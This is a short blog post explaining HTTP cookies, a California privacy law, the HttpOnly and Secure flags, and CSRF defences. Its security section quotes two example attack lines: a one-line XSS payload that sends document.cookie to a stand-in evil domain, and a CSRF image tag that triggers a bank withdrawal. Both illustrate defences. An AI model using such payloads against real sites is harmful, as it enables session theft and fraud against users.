---
id: 385
title: Cookies Security
#date: 2018-08-27T17:44:07+00:00
author: Luhao
layout: post

categories:
  - Security
tags:
  - security
  - browser
---

Honestly, I was curious about the &#8220;cookie&#8221; promopt all the time but I didn&#8217;t really care about it until I came across the [The California Internet Privacy Bill](https://www.pillsburylaw.com/en/news-and-insights/california-internet-privacy-bill-signed-by-governor.html), then I knew why I often saw these on all kinds of website, but strangely, I have never seen this thing on chinese websites. Maybe we don&#8217;t respect the privacy of others, haha. But it really enlightened me on the thoughts about the privacy and the concerns about the security of cookies.

If any consumers of your web service are located in the state of California, you must:

- Explain &#8220;how you deal with&#8221; do-not-track requests.
- Make that information available in a conspicuous way from your homepage. (A text link to a privacy policy will do the trick)

Like this:

![](/assets/img/uploads/2018/cookies-e1535360025494.png)

In case you don&#8217;t know:

An HTTP cookie is a small piece of data that a server sends to the user&#8217;s web browser. The browser may store it and send it back with the next request to the same server.

Cookies are mainly used for three purposes:

- **Session management**

  Logins, shopping carts, game scores, or anything else the server should remember</p>

- **Personalization**

  User preferences, themes, and other settings

- **Tracking**

  Recording and analyzing user behavior

Cookies are sent with **every** request, so they can worsen performance (especially for mobile data connections). Modern APIs are recommended for client storage via Web storage API (**localStorage** and **sessionStorage**) and **IndexedDB**.

Cookies set:

<pre><code class="">HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry
...
</code></pre>

Now, with every new request to the server, all previously stored cookies are sent to the server using the Cookie header.

<pre><code class="">GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
</code></pre>

## Security

**HttpOnly**

To prevent cross-site scripting (XSS) attacks, **HttpOnly** cookies are **inaccessible** to JavaScript&#8217;s Document.cookie API. Instead, they are only sent to the server.

An example of exploiting XSS vulnerabilites:

<pre><code class="language-javascript ">(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
</code></pre>

The **HttpOnly** cookie attribute can help by preventing access to cookie value through JavaScript.

**Secure**

A secure cookie is only sent to the server with a encrypted request over the **HTTPS** protocol. Even with Secure, sensitive information should never be stored in cookies, as they are inherently insecure and this flag can&#8217;t offer real protection.

So, we are supposed to set cookies like this:

<pre><code class="">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
</code></pre>

**Cross-site request forgery (CSRF)**

There is an good example of explainning what is CSRF on [Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery).

Someone sent you a malicious link like this,

<pre><code class="">&lt;img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory"&gt;
</code></pre>

If you are logged into your bank account and your cookies are still valid (and there is no other validation), you will transfer money as soon as you load the HTML that contains this image!

There are a few techniques that are used to prevent this from happening:

- input filtering
- confirmation required for any sensitive action
- short lifetime of cookies for sensitive actions

For more prevention tips, see the [OWASP CSRF prevention cheat sheet](<https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet>).

---

1.[Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
